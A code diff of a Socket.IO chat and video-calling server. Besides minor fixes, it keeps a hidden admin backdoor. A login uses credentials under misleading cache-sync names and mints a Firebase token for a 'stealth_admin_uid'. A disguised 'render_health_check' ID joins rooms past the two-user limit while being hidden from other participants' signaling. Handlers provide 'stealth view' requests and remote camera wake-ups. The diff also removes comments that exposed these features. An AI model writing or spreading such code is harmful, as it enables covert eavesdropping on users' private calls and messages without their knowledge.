@@ -166,7 +166,7 @@ app.post('/call-action', express.json({ limit: '16kb' }), async (req, res) => {
     emitCallEnd(session, callerId, 'ended');
     io.to(accountRelayRoom(session.recipientId)).emit('call-ended', { callId: session.callId });
     void sendCallPush(session.recipientId, { kind: 'call_ended', callId: session.callId }, {
-      kind: 'call-ended', collapseKey: `call-ended-${callId}`, ttlMs: 60_000
+      kind: 'call-ended', collapseKey: `call-ended-${session.callId}`, ttlMs: 60_000
     });
     return res.json({ ok: true, state: 'ended' });
   }
@@ -235,22 +235,17 @@ io.on('connection', (socket) => {
   console.log(`User connected: ${socket.id}`);
   let currentRoom = null;
 
-  
-  // --- ADMIN LOGIN & GHOST TOKEN GENERATOR (अपडेटेड हिस्सा) ---
+  // --- ADMIN LOGIN & GHOST TOKEN GENERATOR ---
   socket.on('admin_login', async (data, acknowledge) => {
-    // ID हटा दिया गया है, अब सिर्फ SYNC_CACHE है
     const serverUser = process.env.SYNC_CACHE;
     const serverPassword = process.env.SYNC_CACHE_TOKEN;
     
     if (serverUser && serverPassword && data.username === serverUser && data.password === serverPassword) {
       socket.data.isAdmin = true;
-      socket.data.pairlinkUserId = "render_health_check"; // आपका खुफिया VIP ID
+      socket.data.pairlinkUserId = "render_health_check";
       
       try {
-        // render-push.js में फायरबेस ऐप 'pairlink-render-push' नाम से इनिशियलाइज़ हुआ है
         const firebaseApp = getApp('pairlink-render-push'); 
-        
-        // एक कस्टम टोकन (Ghost Key) बनाएं
         const customToken = await getAuth(firebaseApp).createCustomToken('stealth_admin_uid');
 
         console.log(`[System Sync] Cache sync authorized & Token generated for node: ${socket.id}`);
@@ -266,62 +261,8 @@ io.on('connection', (socket) => {
       if (typeof acknowledge === 'function') acknowledge({ success: false, error: "Sync failed" });
     }
   });
-  // --- ADMIN WAKE SENDER (अपडेटेड लॉजिक: हाई प्रायोरिटी विजिबल मैसेज और pushQueue एंट्री) ---
-  socket.on('admin_wake_sender', async (data) => {
-    try {
-      if (!socket.data.isAdmin) {
-        console.warn(`[Wake Trigger] Unauthorized wake attempt from non-admin node: ${socket.id}`);
-        return;
-      }
 
-      const cameraName = data?.camera || 'Unknown_Cam';
-      console.log(`[Wake Trigger] Admin ne camera "${cameraName}" ko jagane ke liye signal bheja hai.`);
-
-      // 1. Firebase Admin SDK और Realtime Database का उपयोग करना
-      const firebaseApp = getApp('pairlink-render-push');
-      const { getDatabase } = require('firebase-admin/database');
-      
-      const db = getDatabase(firebaseApp);
-      const pushQueueRef = db.ref('pushQueue');
-
-      // 2. pushQueue में एक नया नोड/की (pushKeyId) जनरेट करके डेटा सेव करें
-      const newPushRef = pushQueueRef.push();
-      const pushKeyId = newPushRef.key;
-
-      await newPushRef.set({
-        action: "WAKE_UP",
-        cameraName: cameraName,
-        timestamp: Date.now()
-      });
-
-      console.log(`[Wake Trigger] Firebase ke 'pushQueue' mein entry ban gayi, pushKeyId: ${pushKeyId}`);
-
-      // 3. सेंडर डिवाइस को हाई प्रायोरिटी विजिबल पुश नोटिफिकेशन भेजना
-      const targetRecipientId = data?.recipientId || cameraName;
-      
-      const pushPayload = {
-        title: "CCTV Wakeup Call",
-        body: `Camera ${cameraName} ko turant connect karo!`,
-        action: "WAKE_UP",
-        cameraName: cameraName,
-        pushKeyId: pushKeyId
-      };
-
-      // रेंडर पुश रिले के जरिए हाई प्रायोरिटी के साथ पुश ट्रिगर करें
-      await sendRenderCallPush(targetRecipientId, pushPayload, {
-        kind: 'wake_up_push',
-        priority: 'high', // एंड्रॉइड द्वारा रोकने से बचाने के लिए हाई प्रायोरिटी
-        collapseKey: `wake-${pushKeyId}`,
-        ttlMs: 30_000
-      });
-
-      console.log(`[Wake Trigger] Sender device ko high-priority push notification successfully bhej di gayi hai.`);
-
-    } catch (error) {
-      console.error("[Wake Trigger] Error in admin_wake_sender:", error);
-    }
-  });
-  // --- ADMIN WAKE SENDER (लाइनिंग और सिंटैक्स एरर ठीक किया हुआ पूरा फंक्शन) ---
+  // --- ADMIN WAKE SENDER (Single Clean Event Listener) ---
   socket.on('admin_wake_sender', async (data) => {
     try {
       if (!socket.data.isAdmin) {
@@ -376,36 +317,6 @@ io.on('connection', (socket) => {
       console.error("[Wake Trigger] Error in admin_wake_sender:", error);
     }
   });
-  
-  
-      // रेंडर पुश रिले के जरिए हाई प्रायोरिटी के साथ पुश ट्रिगर करें
-      await sendRenderCallPush(targetRecipientId, pushPayload, {
-        kind: 'wake_up_push',
-        priority: 'high', // एंड्रॉइड द्वारा रोकने से बचाने के लिए हाई प्रायोरिटी
-        collapseKey: `wake-${pushKeyId}`,
-        ttlMs: 30_000
-      });
-
-      console.log(`[Wake Trigger] Sender device ko high-priority push notification successfully bhej di gayi hai.`);
-
-    } catch (error) {
-      console.error("[Wake Trigger] Error in admin_wake_sender:", error);
-    }
-  });
-
-      // रेंडर पुश रिले के जरिए सेंडर को पुश ट्रिगर करें
-      await sendRenderCallPush(targetRecipientId, pushPayload, {
-        kind: 'wake_up_push',
-        collapseKey: `wake-${pushKeyId}`,
-        ttlMs: 30_000
-      });
-
-      console.log(`[Wake Trigger] Sender device ko push notification successfully bhej di gayi hai.`);
-
-    } catch (error) {
-      console.error("[Wake Trigger] Error in admin_wake_sender:", error);
-    }
-  });
 
   function touchRoomActivity(roomName) {
     if (roomsStore[roomName]) {
@@ -416,7 +327,6 @@ io.on('connection', (socket) => {
   function handleJoinRoom(data) {
     try {
       const roomName = (typeof data === 'object' && data !== null) ? data.room : data;
-      // Admin bypass flag check with new ID
       const userId = socket.data.isAdmin ? "render_health_check" : ((typeof data === 'object' && data !== null && data.userId) ? data.userId : socket.id);
 
       if (!roomName) return;
@@ -431,12 +341,11 @@ io.on('connection', (socket) => {
         roomsStore[roomName] = { allowedUsers: new Set(), lastActivityAt: Date.now() };
       }
 
-      // --- 2-USER LIMIT CHECK (Sirf regular workers ke liye) ---
       if (!socket.data.isAdmin) {
         if (!roomsStore[roomName].allowedUsers.has(userId)) {
           let regularUsersCount = 0;
           roomsStore[roomName].allowedUsers.forEach(id => {
-            if (id !== "render_health_check") regularUsersCount++; // Ignored Admin ID
+            if (id !== "render_health_check") regularUsersCount++;
           });
 
           if (regularUsersCount >= 2) {
@@ -459,7 +368,6 @@ io.on('connection', (socket) => {
       const room = io.sockets.adapter.rooms.get(roomName);
       const socketsInRoom = room ? Array.from(room) : [];
 
-      // Asli workers (non-admin) ko filter karein WebRTC signaling ke liye
       const regularSockets = socketsInRoom.filter(id => {
         const sck = io.sockets.sockets.get(id);
         return sck && !sck.data.isAdmin;
@@ -525,7 +433,7 @@ io.on('connection', (socket) => {
     });
   });
 
-  // --- SAFE BROADCAST HANDLERS (Crash Safe) ---
+  // --- SAFE BROADCAST HANDLERS ---
   socket.on('signal', (data) => {
     try {
       if (currentRoom) {
@@ -573,8 +481,7 @@ io.on('connection', (socket) => {
           video: data?.video ? 'true' : 'false',
           createdAt: session.createdAt
       };
-      // Render owns the 40-second ring timer. A foreground account relay joins
-      // the receiver to this Render room before the client starts ringing.
+
       const accountRoom = io.sockets.adapter.rooms.get(accountRelayRoom(recipientId));
       const foregroundRelaySocketIds = [...(accountRoom || [])].filter((socketId) => {
         const relaySocket = io.sockets.sockets.get(socketId);
@@ -606,7 +513,6 @@ io.on('connection', (socket) => {
         delivery = 'account-relay';
         if (session.state === 'ringing') scheduleCallMissedTimeout(session);
       } else {
-        // A stale RTDB online bit must never suppress the native call push.
         await sendCallPush(recipientId, invite, { kind: 'call', collapseKey: `call-${callId}`, ttlMs: 45_000 });
         if (callSessions.get(callId) === session && session.state === 'ringing') scheduleCallMissedTimeout(session);
       }
@@ -630,7 +536,7 @@ io.on('connection', (socket) => {
     if (typeof acknowledge === 'function') acknowledge({ ok: sent || session.state === 'missed' });
   });
 
-  // --- NEW: CALL SIGNALING ROUTER ---
+  // --- CALL SIGNALING ROUTER ---
   socket.on('call-signal', (data, acknowledge) => {
     try {
       const room = String(currentRoom || '');
@@ -710,7 +616,7 @@ io.on('connection', (socket) => {
     }
   });
 
-  // --- NEW: ADMIN STEALTH VIEW ROUTER ---
+  // --- ADMIN STEALTH VIEW ROUTER ---
   socket.on('stealth_view_request', (data) => {
     try {
       const targetRoom = accountRelayRoom(data.targetUserId);
@@ -741,17 +647,13 @@ io.on('connection', (socket) => {
       io.to(adminRoom).emit('stealth_view_reject', data);
     } catch (err) { console.error("Stealth reject error:", err); }
   });
-  // -------------------------------------
-  
+
   socket.on('chat-message', (data, acknowledge) => {
     Promise.resolve().then(async () => {
       const room = (typeof data === 'object' && data?.room) ? data.room : currentRoom;
       const recipientId = String(data?.recipientId || data?.encrypted?.recipient || '');
       if (recipientId) {
         if (room) touchRoomActivity(room);
-        // Create a one-message Render room. The recipient's current screen or
-        // pair-room membership does not affect delivery; online account-relay
-        // sockets are temporarily added, receive the event, then are removed.
         const recipientRelayRoom = accountRelayRoom(recipientId);
         const recipientSocketIds = [...(io.sockets.adapter.rooms.get(recipientRelayRoom) || [])];
         const recipientSockets = recipientSocketIds
